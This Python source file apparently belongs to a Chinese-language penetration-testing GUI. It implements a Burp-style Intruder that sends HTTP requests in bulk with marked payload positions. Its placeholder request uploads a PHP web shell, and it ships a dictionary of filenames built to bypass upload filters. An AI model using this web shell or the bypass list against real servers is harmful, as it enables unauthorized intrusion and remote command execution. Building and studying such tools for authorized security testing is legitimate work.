#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Intruder模块 - Burp风格的爆破功能
支持标记payload位置，多种攻击模式
"""

import re
import httpx
import asyncio
from typing import List, Dict, Tuple
from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QTextEdit, QLineEdit,
    QPushButton, QComboBox, QLabel, QTableWidget, QTableWidgetItem,
    QHeaderView, QSplitter, QGroupBox, QProgressBar, QSpinBox,
    QCheckBox, QTabWidget, QFileDialog, QMessageBox, QPlainTextEdit,
    QApplication, QFrame, QSizePolicy, QProxyStyle, QStyle, QTabBar,
    QStackedWidget, QInputDialog
)
from PySide6.QtCore import Qt, Signal, QThread
from PySide6.QtGui import QColor, QFont, QTextCursor

from .themes.dark_theme import COLORS
from .syntax_highlighter import HTTPHighlighter


class _NoFocusStyle(QProxyStyle):
    def drawPrimitive(self, element, option, painter, widget=None):
        if element == QStyle.PE_FrameFocusRect:
            return
        super().drawPrimitive(element, option, painter, widget)


class SortableTableWidgetItem(QTableWidgetItem):
    """【新增】支持数值排序的表格项"""
    def __lt__(self, other):
        if not other or other.column() != self.column():
            return False
        
        try:
            # 根据列索引处理不同类型的排序
            col = self.column()
            
            if col == 0:  # # 列
                return int(self.text()) < int(other.text())
            elif col == 2:  # 状态码列
                return int(self.text()) < int(other.text())
            elif col == 3:  # 长度列
                return int(self.text()) < int(other.text())
            elif col == 1:  # Payload 列
                return self.text().lower() < other.text().lower()
            else:
                return super().__lt__(other)
        except (ValueError, AttributeError):
            return False


class IntruderWorker(QThread):
    """Intruder异步工作线程"""
    
    result_ready = Signal(dict)
    progress_update = Signal(int, int)
    finished_signal = Signal()
    error_signal = Signal(str)
    
    def __init__(self, base_request: dict, payloads: List[List[str]], 
                 attack_mode: str = "sniper", threads: int = 10):
        super().__init__()
        self.base_request = base_request
        self.payloads = payloads
        self.attack_mode = attack_mode
        self.threads = threads
        self._is_running = True
        self._loop = None
    
    def stop(self):
        self._is_running = False
        if self._loop and self._loop.is_running():
            self._loop.stop()
        self.wait(1000)
    
    def run(self):
        import sys
        try:
            self._loop = asyncio.new_event_loop()
            
            # Linux 环境使用 Selector
            if sys.platform.startswith('linux'):
                self._loop = asyncio.SelectorEventLoop()
            
            asyncio.set_event_loop(self._loop)
            self._loop.run_until_complete(self._attack())
        except Exception as e:
            self.error_signal.emit(str(e))
        finally:
            if self._loop and not self._loop.is_closed():
                try:
                    self._loop.close()
                except Exception:
                    pass
    
    async def _attack(self):
        url = self.base_request.get('url', '')
        method = self.base_request.get('method', 'GET')
        headers = self.base_request.get('headers', {})
        body = self.base_request.get('body', '')
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        headers.pop('Content-Length', None)
        headers.pop('content-length', None)
        
        positions = self._get_payload_positions(url, headers, body)
        
        if not positions:
            self.error_signal.emit("未找到payload位置，请使用 § § 标记")
            return
        
        requests = self._generate_requests(url, headers, body, positions)
        total = len(requests)
        
        if total == 0:
            self.error_signal.emit("没有生成任何请求")
            return
        
        semaphore = asyncio.Semaphore(self.threads)
        completed = [0]
        lock = asyncio.Lock()
        
        async def send_request_with_limit(idx, req_data):
            async with semaphore:
                if not self._is_running:
                    return
                result = await self._send_single_request(method, req_data)
                result['index'] = idx
                result['payload'] = req_data.get('payload_info', '')
                self.result_ready.emit(result)
                async with lock:
                    completed[0] += 1
                    current = completed[0]
                self.progress_update.emit(current, total)
        
        tasks = [send_request_with_limit(i, req) for i, req in enumerate(requests)]
        await asyncio.gather(*tasks)
        self.finished_signal.emit()
    
    def _get_payload_positions(self, url: str, headers: dict, body: str) -> List[Tuple[str, int, int]]:
        positions = []
        marker = '§' 
        
        idx = 0
        while True:
            start = url.find(marker, idx)
            if start == -1:
                break
            end = url.find(marker, start + 1)
            if end == -1:
                break
            positions.append(('url', start, end + 1))
            idx = end + 1
        
        idx = 0
        while True:
            start = body.find(marker, idx)
            if start == -1:
                break
            end = body.find(marker, start + 1)
            if end == -1:
                break
            positions.append(('body', start, end + 1))
            idx = end + 1
        
        return positions
    
    def _generate_requests(self, url: str, headers: dict, body: str, 
                          positions: List[Tuple[str, int, int]]) -> List[dict]:
        requests = []
        
        if self.attack_mode == "sniper":
            # 【修复】Sniper: 每个位置使用对应的payload集合
            # 位置1 -> 集合1, 位置2 -> 集合2, ...
            # 如果位置数超过集合数，多余的位置使用最后一个集合
            for pos_idx, (pos_type, start, end) in enumerate(positions):
                # 【修复】根据位置索引选择对应的payload集合
                if pos_idx < len(self.payloads):
                    payload_list = self.payloads[pos_idx]
                elif self.payloads:
                    # 位置超过集合数，使用最后一个集合
                    payload_list = self.payloads[-1]
                else:
                    continue  # 没有payload集合，跳过
                
                for payload in payload_list:
                    req = self._create_request(url, headers, body, positions, pos_idx, payload)
                    req['payload_info'] = f"位置{pos_idx+1}: {payload[:50]}"
                    requests.append(req)
        
        elif self.attack_mode == "battering_ram":
            # Battering Ram: 使用第一个payload集合，同时替换所有位置
            if self.payloads:
                payload_list = self.payloads[0]  # 只使用第一个集合
                for payload in payload_list:
                    req = self._create_request_all_positions(url, headers, body, positions, payload)
                    req['payload_info'] = f"全部位置: {payload[:50]}"
                    requests.append(req)
        
        elif self.attack_mode == "pitchfork":
            # Pitchfork: 多个集合一一对应
            # 集合1 → 位置1, 集合2 → 位置2, ...
            # 执行次数 = min(len(集合1), len(集合2), ...)
            if self.payloads and positions:
                min_len = min(len(pl) for pl in self.payloads) if self.payloads else 0
                for i in range(min_len):
                    payloads_for_req = [pl[i] for pl in self.payloads]
                    req = self._create_request_pitchfork(url, headers, body, positions, payloads_for_req)
                    req['payload_info'] = f"组合: {' | '.join(p[:30] for p in payloads_for_req)}"
                    requests.append(req)
        
        elif self.attack_mode == "cluster_bomb":
            # Cluster Bomb: 笛卡尔积模式
            # 集合1 × 集合2 × ... = 所有组合
            # 例如: 集合1有3个, 集合2有2个 → 3×2=6次请求
            if self.payloads and positions:
                from itertools import product
                for combo in product(*self.payloads):
                    req = self._create_request_pitchfork(url, headers, body, positions, list(combo))
                    req['payload_info'] = f"笛卡尔积: {' | '.join(c[:20] for c in combo)}"
                    requests.append(req)
        
        return requests
    
    def _create_request(self, url: str, headers: dict, body: str,
                       positions: List[Tuple[str, int, int]],
                       target_idx: int, payload: str) -> dict:
        new_url = url
        new_body = body

        # Process all positions in reverse order to avoid index corruption.
        # Target position is replaced with payload; other positions are removed (empty string).
        all_positions = sorted(
            [(i, pos_type, start, end) for i, (pos_type, start, end) in enumerate(positions)],
            key=lambda x: x[2], reverse=True
        )

        for i, pos_type, start, end in all_positions:
            replacement = payload if i == target_idx else ''
            if pos_type == 'url':
                new_url = new_url[:start] + replacement + new_url[end:]
            else:
                new_body = new_body[:start] + replacement + new_body[end:]

        return {'url': new_url, 'headers': headers, 'body': new_body}
    
    def _create_request_all_positions(self, url: str, headers: dict, body: str,
                                      positions: List[Tuple[str, int, int]], 
                                      payload: str) -> dict:
        new_url = url
        new_body = body
        
        for pos_type, start, end in sorted(positions, reverse=True):
            if pos_type == 'url':
                new_url = new_url[:start] + payload + new_url[end:]
            else:
                new_body = new_body[:start] + payload + new_body[end:]
        
        new_url = new_url.replace('§', '')
        new_body = new_body.replace('§', '')
        
        return {'url': new_url, 'headers': headers, 'body': new_body}
    
    def _create_request_pitchfork(self, url: str, headers: dict, body: str,
                                  positions: List[Tuple[str, int, int]],
                                  payloads: List[str]) -> dict:
        new_url = url
        new_body = body

        # Pair each position with its payload and sort by start index descending
        # to avoid index corruption when string lengths change after each replacement.
        paired = sorted(
            [(pos_type, start, end, payloads[i] if i < len(payloads) else '')
             for i, (pos_type, start, end) in enumerate(positions)],
            key=lambda x: x[1], reverse=True
        )

        for pos_type, start, end, payload in paired:
            if pos_type == 'url':
                new_url = new_url[:start] + payload + new_url[end:]
            else:
                new_body = new_body[:start] + payload + new_body[end:]

        return {'url': new_url, 'headers': headers, 'body': new_body}
    
    async def _send_single_request(self, method: str, req_data: dict) -> dict:
        url = req_data['url']
        headers = req_data['headers']
        body = req_data['body']
        
        # 构建请求字符串用于显示
        request_lines = [f"{method} {url} HTTP/1.1"]
        for k, v in headers.items():
            request_lines.append(f"{k}: {v}")
        if body:
            request_lines.append("")
            request_lines.append(body if isinstance(body, str) else body.decode('utf-8', errors='replace'))
        request_str = "\n".join(request_lines)
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=30, follow_redirects=True) as client:
                request_kwargs = {'headers': headers}
                if body:
                    if isinstance(body, str):
                        request_kwargs['content'] = body.encode('utf-8')
                    else:
                        request_kwargs['content'] = body
                
                if method == 'GET':
                    response = await client.get(url, **request_kwargs)
                elif method == 'POST':
                    response = await client.post(url, **request_kwargs)
                elif method == 'PUT':
                    response = await client.put(url, **request_kwargs)
                elif method == 'DELETE':
                    response = await client.delete(url, **request_kwargs)
                elif method == 'PATCH':
                    response = await client.patch(url, **request_kwargs)
                else:
                    response = await client.request(method, url, **request_kwargs)
                
                # 构建响应头字符串
                response_headers = "\n".join([f"{k}: {v}" for k, v in response.headers.items()])
                
                return {
                    'status_code': response.status_code,
                    'length': len(response.content),
                    'body': response.text,
                    'body_bytes': response.content,
                    'headers': response_headers,
                    'request': request_str,  # 添加请求数据
                    'error': ''
                }
        except Exception as e:
            return {
                'status_code': 0, 
                'length': 0, 
                'body': '', 
                'body_bytes': b'',
                'headers': '',
                'request': request_str,  # 即使失败也返回请求
                'error': str(e)
            }


class IntruderTab(QWidget):
    """单个Intruder标签页"""
    
    def __init__(self, tab_name: str = "Intruder"):
        super().__init__()
        self.tab_name = tab_name
        self.worker = None
        self.payload_sets = [[]]
        self.current_mode = "sniper"
        self.init_ui()
    
    def init_ui(self):
        # 主布局
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(10)
        
        # 顶部控制栏
        top_layout = QHBoxLayout()
        top_layout.setSpacing(10)
        
        top_layout.addWidget(QLabel("攻击模式:"))
        self.attack_mode = QComboBox()
        # 汉化攻击模式，添加详细说明
        self.attack_mode.addItems([
            "Sniper (狙击手 - 单payload逐位置测试)",
            "Battering Ram (攻城锤 - 单payload全位置)",
            "Pitchfork (草叉 - 多集合一一对应)",
            "Cluster Bomb (集束炸弹 - 笛卡尔积)"
        ])
        self.attack_mode.setToolTip(
            "攻击模式说明:\n"
            "• Sniper: 使用单个payload集合，逐个位置依次测试\n"
            "• Battering Ram: 使用单个payload集合，同时替换所有位置\n"
            "• Pitchfork: 多个payload集合一一对应 (集合1→位置1, 集合2→位置2)\n"
            "  例如: 集合1有3个元素，集合2有2个元素，则执行min(3,2)=2次请求\n"
            "• Cluster Bomb: 笛卡尔积模式，所有集合的所有组合\n"
            "  例如: 集合1有3个元素，集合2有2个元素，则执行3×2=6次请求"
        )
        self.attack_mode.currentIndexChanged.connect(self._on_mode_changed)
        self.attack_mode.setMinimumWidth(320)
        top_layout.addWidget(self.attack_mode)
        
        top_layout.addWidget(QLabel("线程:"))
        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 100)
        self.thread_spin.setValue(10)
        self.thread_spin.setFixedWidth(70)
        top_layout.addWidget(self.thread_spin)
        
        top_layout.addStretch()
        
        self.mark_btn = QPushButton("标记 §")
        self.mark_btn.setFixedWidth(80)
        self.mark_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['accent']};
                color: white;
                border: none;
                padding: 5px 10px;
                border-radius: 4px;
                font-weight: bold;
            }}
            QPushButton:hover {{
                background-color: {COLORS['accent_hover']};
            }}
        """)
        self.mark_btn.clicked.connect(self._mark_position)
        top_layout.addWidget(self.mark_btn)
        
        self.clear_mark_btn = QPushButton("清除 §")
        self.clear_mark_btn.setFixedWidth(80)
        self.clear_mark_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_primary']};
                border: 1px solid {COLORS['border']};
                padding: 5px 10px;
                border-radius: 4px;
            }}
            QPushButton:hover {{
                background-color: {COLORS['border']};
            }}
        """)
        self.clear_mark_btn.clicked.connect(self._clear_marks)
        top_layout.addWidget(self.clear_mark_btn)
        
        main_layout.addLayout(top_layout)
        
        # 主分割器 - 水平分割左右面板
        main_splitter = QSplitter(Qt.Horizontal)
        main_splitter.setHandleWidth(8)
        main_splitter.setStyleSheet(f"""
            QSplitter::handle {{
                background-color: {COLORS['border']};
            }}
            QSplitter::handle:hover {{
                background-color: {COLORS['accent']};
            }}
        """)
        
        # 左侧面板 - 请求和Payload
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(0, 0, 0, 0)
        left_layout.setSpacing(10)
        
        # 请求编辑区域
        req_group = QGroupBox("请求模板 (§标记位置)")
        req_group.setStyleSheet(f"""
            QGroupBox {{
                font-weight: bold;
                color: {COLORS['accent']};
                border: 1px solid {COLORS['border']};
                border-radius: 6px;
                margin-top: 12px;
                padding-top: 10px;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
            }}
        """)
        req_layout = QVBoxLayout(req_group)
        req_layout.setContentsMargins(8, 8, 8, 8)
        
        self.req_edit = QPlainTextEdit()
        self.req_edit.setFont(QFont("Consolas", 10))
        self.req_edit.setPlaceholderText(
            "POST /upload.php HTTP/1.1\n"
            "Host: example.com\n"
            "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n"
            "------WebKitFormBoundary\n"
            'Content-Disposition: form-data; name="file"; filename="§shell.php§"\n\n'
            "<?php system($_GET['cmd']); ?>"
        )
        self.req_edit.setMinimumHeight(200)
        self.highlighter_req = HTTPHighlighter(self.req_edit.document(), is_request=True)
        req_layout.addWidget(self.req_edit)
        
        left_layout.addWidget(req_group, 2)
        
        # Payload配置区域
        payload_group = QGroupBox("Payload 配置")
        payload_group.setStyleSheet(f"""
            QGroupBox {{
                font-weight: bold;
                color: {COLORS['accent']};
                border: 1px solid {COLORS['border']};
                border-radius: 6px;
                margin-top: 12px;
                padding-top: 10px;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
            }}
        """)
        payload_layout = QVBoxLayout(payload_group)
        payload_layout.setContentsMargins(8, 8, 8, 8)
        payload_layout.setSpacing(8)
        
        # Payload控制栏 - 修复按钮显示不全问题
        payload_control = QHBoxLayout()
        payload_control.setSpacing(8)
        
        payload_control.addWidget(QLabel("集合:"))
        self.payload_set_combo = QComboBox()
        self.payload_set_combo.addItem("1")
        self.payload_set_combo.currentIndexChanged.connect(self._on_payload_set_changed)
        self.payload_set_combo.setFixedWidth(60)
        payload_control.addWidget(self.payload_set_combo)
        
        # + 按钮 - 【修复】增大宽度确保文字显示完整
        add_set_btn = QPushButton("添加")
        add_set_btn.setFixedWidth(70)
        add_set_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['success']};
                color: white;
                border: none;
                border-radius: 4px;
                font-weight: bold;
                padding: 5px 10px;
            }}
            QPushButton:hover {{
                background-color: #059669;
            }}
        """)
        add_set_btn.setToolTip("添加新Payload集合")
        add_set_btn.clicked.connect(self._add_payload_set)
        payload_control.addWidget(add_set_btn)
        
        # 【修复】增加按钮宽度和间距，确保文字显示完整
        load_file_btn = QPushButton("从文件加载")
        load_file_btn.setMinimumWidth(120)
        load_file_btn.setMaximumWidth(150)
        load_file_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_primary']};
                border: 1px solid {COLORS['border']};
                border-radius: 4px;
                padding: 5px 12px;
            }}
            QPushButton:hover {{
                background-color: {COLORS['border']};
            }}
        """)
        load_file_btn.clicked.connect(self._load_payload_file)
        payload_control.addWidget(load_file_btn)
        
        load_dict_btn = QPushButton("加载字典")
        load_dict_btn.setMinimumWidth(100)
        load_dict_btn.setMaximumWidth(120)
        load_dict_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_primary']};
                border: 1px solid {COLORS['border']};
                border-radius: 4px;
                padding: 5px 12px;
            }}
            QPushButton:hover {{
                background-color: {COLORS['border']};
            }}
        """)
        load_dict_btn.clicked.connect(self._load_bypass_dict)
        payload_control.addWidget(load_dict_btn)
        
        clear_btn = QPushButton("清空")
        clear_btn.setMinimumWidth(70)
        clear_btn.setMaximumWidth(90)
        clear_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['danger']};
                color: white;
                border: none;
                border-radius: 4px;
                padding: 5px 12px;
            }}
            QPushButton:hover {{
                background-color: #dc2626;
            }}
        """)
        clear_btn.clicked.connect(self._clear_payloads)
        payload_control.addWidget(clear_btn)
        
        # 添加弹簧，将按钮推向左侧
        payload_control.addStretch()
        
        payload_layout.addLayout(payload_control)
        
        # Payload输入框
        self.payload_input = QPlainTextEdit()
        self.payload_input.setFont(QFont("Consolas", 10))
        self.payload_input.setPlaceholderText("每行一个payload...")
        self.payload_input.setMinimumHeight(120)
        payload_layout.addWidget(self.payload_input)
        
        left_layout.addWidget(payload_group, 1)
        
        main_splitter.addWidget(left_panel)
        
        # 右侧面板 - 攻击控制和结果
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.setSpacing(10)
        
        # 攻击控制栏
        attack_control = QHBoxLayout()
        attack_control.setSpacing(10)
        
        self.start_btn = QPushButton("开始攻击")
        self.start_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['danger']};
                color: white;
                border: none;
                padding: 8px 20px;
                border-radius: 4px;
                font-weight: bold;
                font-size: 13px;
            }}
            QPushButton:hover {{
                background-color: #dc2626;
            }}
            QPushButton:disabled {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_secondary']};
            }}
        """)
        self.start_btn.clicked.connect(self._start_attack)
        attack_control.addWidget(self.start_btn)
        
        self.stop_btn = QPushButton("停止")
        self.stop_btn.setEnabled(False)
        self.stop_btn.setStyleSheet(f"""
            QPushButton {{
                background-color: {COLORS['warning']};
                color: white;
                border: none;
                padding: 8px 20px;
                border-radius: 4px;
                font-weight: bold;
            }}
            QPushButton:hover {{
                background-color: #d97706;
            }}
            QPushButton:disabled {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_secondary']};
            }}
        """)
        self.stop_btn.clicked.connect(self._stop_attack)
        attack_control.addWidget(self.stop_btn)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setMaximumHeight(25)
        self.progress_bar.setStyleSheet(f"""
            QProgressBar {{
                border: none;
                background-color: {COLORS['bg_tertiary']};
                border-radius: 4px;
                text-align: center;
                color: {COLORS['text_primary']};
            }}
            QProgressBar::chunk {{
                background-color: {COLORS['accent']};
                border-radius: 4px;
            }}
        """)
        attack_control.addWidget(self.progress_bar, 1)
        
        self.status_label = QLabel("就绪")
        self.status_label.setStyleSheet(f"color: {COLORS['text_secondary']};")
        attack_control.addWidget(self.status_label)
        
        right_layout.addLayout(attack_control)
        
        # 【关键修复】使用垂直分割器分割攻击结果表格和详情区域
        results_detail_splitter = QSplitter(Qt.Vertical)
        results_detail_splitter.setHandleWidth(8)
        results_detail_splitter.setStyleSheet(f"""
            QSplitter::handle {{
                background-color: {COLORS['border']};
            }}
            QSplitter::handle:hover {{
                background-color: {COLORS['accent']};
            }}
        """)
        
        # 结果表格
        results_group = QGroupBox("攻击结果")
        results_group.setStyleSheet(f"""
            QGroupBox {{
                font-weight: bold;
                color: {COLORS['accent']};
                border: 1px solid {COLORS['border']};
                border-radius: 6px;
                margin-top: 12px;
                padding-top: 10px;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
            }}
        """)
        results_layout = QVBoxLayout(results_group)
        results_layout.setContentsMargins(8, 8, 8, 8)
        
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(5)
        self.results_table.setHorizontalHeaderLabels(["#", "Payload", "状态码", "响应字节", "错误"])
        self.results_table.setColumnWidth(0, 50)
        self.results_table.setColumnWidth(2, 70)
        self.results_table.setColumnWidth(3, 70)
        self.results_table.setColumnWidth(4, 100)
        
        header = self.results_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.Fixed)
        header.setSectionResizeMode(1, QHeaderView.Stretch)
        header.setSectionResizeMode(2, QHeaderView.Fixed)
        header.setSectionResizeMode(3, QHeaderView.Fixed)
        header.setSectionResizeMode(4, QHeaderView.Fixed)
        
        self.results_table.setAlternatingRowColors(True)
        self.results_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.results_table.setEditTriggers(QTableWidget.NoEditTriggers)
        self.results_table.setStyle(_NoFocusStyle(self.results_table.style()))
        self.results_table.itemClicked.connect(self._show_result_detail)
        
        # 【新增】启用排序功能
        self.results_table.setSortingEnabled(True)
        self.results_table.setStyleSheet(f"""
            QTableWidget {{
                background-color: {COLORS['bg_secondary']};
                color: {COLORS['text_primary']};
                border: 1px solid {COLORS['border']};
                gridline-color: {COLORS['border']};
            }}
            QTableWidget::item:focus {{
                outline: 0px;
            }}
            QTableWidget::item:selected {{
                background-color: {COLORS['accent']};
                color: white;
                border: none;
            }}
            QHeaderView::section {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_primary']};
                padding: 8px;
                border: none;
                border-right: 1px solid {COLORS['border']};
                font-weight: bold;
            }}
        """)
        results_layout.addWidget(self.results_table)
        results_detail_splitter.addWidget(results_group)
        
        # 结果详情区域 - 使用TabWidget分割请求和响应
        detail_group = QGroupBox("详情")
        detail_group.setStyleSheet(f"""
            QGroupBox {{
                font-weight: bold;
                color: {COLORS['accent']};
                border: 1px solid {COLORS['border']};
                border-radius: 6px;
                margin-top: 12px;
                padding-top: 10px;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 12px;
                padding: 0 8px;
            }}
        """)
        detail_layout = QVBoxLayout(detail_group)
        detail_layout.setContentsMargins(8, 8, 8, 8)
        detail_layout.setSpacing(5)
        
        # 详情信息栏
        info_h_layout = QHBoxLayout()
        info_h_layout.setSpacing(15)
        
        self.detail_status = QLabel("")
        self.detail_status.setStyleSheet(f"color: {COLORS['warning']}; font-weight: bold;")
        info_h_layout.addWidget(self.detail_status)
        
        self.detail_length = QLabel("")
        self.detail_length.setStyleSheet(f"color: {COLORS['text_secondary']};")
        info_h_layout.addWidget(self.detail_length)
        
        self.detail_payload = QLabel("")
        self.detail_payload.setStyleSheet(f"color: {COLORS['accent']};")
        self.detail_payload.setWordWrap(True)
        info_h_layout.addWidget(self.detail_payload, 1)
        
        detail_layout.addLayout(info_h_layout)
        
        # 请求/响应Tab
        self.detail_tabs = QTabWidget()
        # 【新增】应用暗色主题到 TabWidget
        self.detail_tabs.setStyleSheet(f"""
            QTabWidget::pane {{
                border: 1px solid {COLORS['border']};
                background-color: {COLORS['bg_secondary']};
            }}
            QTabBar::tab {{
                background-color: {COLORS['bg_tertiary']};
                color: {COLORS['text_primary']};
                border: 1px solid {COLORS['border']};
                padding: 8px 16px;
                margin-right: 2px;
            }}
            QTabBar::tab:selected {{
                background-color: {COLORS['accent']};
                color: white;
            }}
            QTabBar::tab:hover {{
                background-color: {COLORS['border']};
            }}
        """)
        
        # 请求Tab
        self.request_text = QPlainTextEdit()
        self.request_text.setReadOnly(True)
        self.request_text.setFont(QFont("Consolas", 10))
        # 【新增】应用暗色主题
        self.request_text.setStyleSheet(f"""
            QPlainTextEdit {{
                background-color: {COLORS['bg_secondary']};
                border: 1px solid {COLORS['border']};
                selection-background-color: {COLORS['accent']};
            }}
        """)
        self.request_text.setPlaceholderText("点击结果查看请求...")
        self.highlighter_request = HTTPHighlighter(self.request_text.document(), is_request=True)
        self.detail_tabs.addTab(self.request_text, "请求")
        
        # 响应Tab - 【新增】使用ResponseViewerWidget支持Render视图
        try:
            from .response_viewer import ResponseViewerWidget
            self.response_viewer = ResponseViewerWidget()
            self.detail_tabs.addTab(self.response_viewer, "响应")
            # 保留引用用于兼容
            self.response_text = self.response_viewer.raw_view
            
            # 【修复】当切换到响应选项卡时，强制刷新 Render 视图
            self.detail_tabs.currentChanged.connect(self._on_detail_tab_changed)
        except ImportError:
            # 回退到纯文本视图
            self.response_text = QPlainTextEdit()
            self.response_text.setReadOnly(True)
            self.response_text.setFont(QFont("Consolas", 10))
            self.response_text.setPlaceholderText("点击结果查看响应...")
            self.highlighter_response = HTTPHighlighter(self.response_text.document(), is_request=False)
            self.detail_tabs.addTab(self.response_text, "响应")
        
        detail_layout.addWidget(self.detail_tabs)
        
        # 保留旧的detail_text用于兼容
        self.detail_text = self.response_text
        
        results_detail_splitter.addWidget(detail_group)
        
        # 【关键修复】设置攻击结果小一点，响应详情区域大一点
        results_detail_splitter.setStretchFactor(0, 1)
        results_detail_splitter.setStretchFactor(1, 3)
        results_detail_splitter.setSizes([150, 450])
        
        right_layout.addWidget(results_detail_splitter, 1)
        
        main_splitter.addWidget(right_panel)
        
        # 设置分割器初始大小
        main_splitter.setSizes([500, 700])
        
        main_layout.addWidget(main_splitter, 1)
    
    def _on_mode_changed(self, index):
        """攻击模式改变"""
        modes = ["sniper", "battering_ram", "pitchfork", "cluster_bomb"]
        if 0 <= index < len(modes):
            self.current_mode = modes[index]
    
    def _mark_position(self):
        cursor = self.req_edit.textCursor()
        if cursor.hasSelection():
            # 如果有选中文本，用标记符包围
            selected = cursor.selectedText()
            cursor.insertText(f"§{selected}§")
        else:
            # 如果没有选中文本，在当前位置插入标记符
            cursor.insertText("§§")
            # 将光标移动到两个标记符中间
            cursor.movePosition(QTextCursor.Left)
            self.req_edit.setTextCursor(cursor)
    
    def _clear_marks(self):
        text = self.req_edit.toPlainText()
        self.req_edit.setPlainText(text.replace('§', ''))
    
    def _add_payload_set(self):
        self.payload_sets.append([])
        self.payload_set_combo.addItem(str(len(self.payload_sets)))
        self.payload_set_combo.setCurrentIndex(len(self.payload_sets) - 1)
    
    def _on_payload_set_changed(self, index):
        if 0 <= index < len(self.payload_sets):
            self.payload_input.setPlainText('\n'.join(self.payload_sets[index]))
    
    def _on_detail_tab_changed(self, index: int):
        """当切换到响应选项卡时，强制刷新 Render 视图"""
        # 响应Tab的索引是1（请求Tab是0）
        if index == 1 and hasattr(self, 'response_viewer'):
            # 延迟一点刷新，确保 Tab 已完全显示
            from PySide6.QtCore import QTimer
            QTimer.singleShot(50, lambda: self._refresh_render_view())
    
    def _refresh_render_view(self):
        """强制刷新 Render 视图"""
        if hasattr(self, 'response_viewer'):
            try:
                self.response_viewer._update_render_view()
            except Exception:
                pass
    
    def _clear_payloads(self):
        self.payload_input.clear()
        idx = self.payload_set_combo.currentIndex()
        if idx >= 0:
            self.payload_sets[idx] = []
    
    def _load_payload_file(self):
        filename, _ = QFileDialog.getOpenFileName(self, "选择Payload文件", "", "文本文件 (*.txt)")
        if filename:
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    payloads = [line.strip() for line in f if line.strip()]
                self.payload_input.setPlainText('\n'.join(payloads))
                idx = self.payload_set_combo.currentIndex()
                if idx >= 0:
                    self.payload_sets[idx] = payloads
            except Exception as e:
                QMessageBox.critical(self, "错误", f"加载失败: {str(e)}")
    
    def _load_bypass_dict(self):
        # 【更新】扩展bypass字典
        bypass_payloads = [
            # 基础扩展名绕过
            "shell.php", "shell.php.", "shell.php5", "shell.php4", "shell.php3", "shell.php2",
            "shell.phtml", "shell.pht", "shell.phps", "shell.phar", "shell.php7", "shell.php8",
            "shell.asp", "shell.asp", "shell.aspx", "shell.cer", "shell.cdi",
            "shell.jsp", "shell.jspx", "shell.jsw", "shell.jsf", "shell.jhtml",
            "shell.cshtml", "shell.cfm", "shell.htaccess",
            "shell.jpg", "shell.png", "shell.gif", "shell.pdf", "shell.html", "shell.htm",
            
            # 【新增】双扩展名绕过
            "shell.jpg.php", "shell.jpg.php5", "shell.jpg.phtml",
            "shell.png.php", "shell.png.jsp",
            "shell.gif.php", "shell.gif.aspx",
            "shell.html.php", "shell.htm.php",
            
            # 【新增】点号填充
            "shell.php.", "shell.php...", "shell.php....",
            "shell.asp...", "shell.jsp....",
            
            # 【新增】空格和特殊字符
            "shell.php ", "shell.php%20",
            "shell.php%0a", "shell.php%0d", "shell.php%09", "shell.php%0a%0d",
            "shell.php\x00.jpg", "shell.php\x00.png",
            
            # 【新增】大小写绕过
            "shell.PHP", "shell.PhP", "shell.pHp", "shell.Php", "shell.pHP",
            "shell.ASP", "shell.ASPX", "shell.JSP",
            
            # 【新增】Windows特性
            "shell.php::$DATA", "shell.asp::$DATA", "shell.jsp::$DATA",
            "shell.php:.jpg", "shell.asp:.jpg", "shell.jsp:.jpg",
            "shell.php.", "shell.php.txt",
            
            # 【新增】00截断变体
            "shell.php%00", "shell.php%00.jpg", "shell.php%00.png", "shell.php%00.gif",
            "shell.php%0a", "shell.php%0a.jpg", "shell.php%0d.jpg",
            "shell.php\x00.jpg", "shell.php\n.jpg",
            
            # 【新增】分号和点号混合
            "shell.php;.jpg", "shell.php;.png", "shell.php;.gif",
            "shell.asp;.jpg", "shell.jsp;.jpg",
            
            # 【新增】HTM绕过
            "shell.htaccess", "shell.htaccess.jpg",
            "shell.xhtml", "shell.xhtml.php",
            
            # 【新增】常见WebShell名称
            "cmd.php", "backdoor.php", "webshell.php", "upload.php", "test.php", "shell.php",
            "x.php", "a.php", "c.php", "l.php", "s.php", "z.php",
            
            # 【新增】MIME伪造扩展名（配合Content-Type绕过）
            "shell.jpg", "shell.png", "shell.gif", "shell.bmp", "shell.webp",
            "shell.jpeg", "shell.JPEG", "shell.Jpg",
        ]
        self.payload_input.setPlainText('\n'.join(bypass_payloads))
        idx = self.payload_set_combo.currentIndex()
        if idx >= 0:
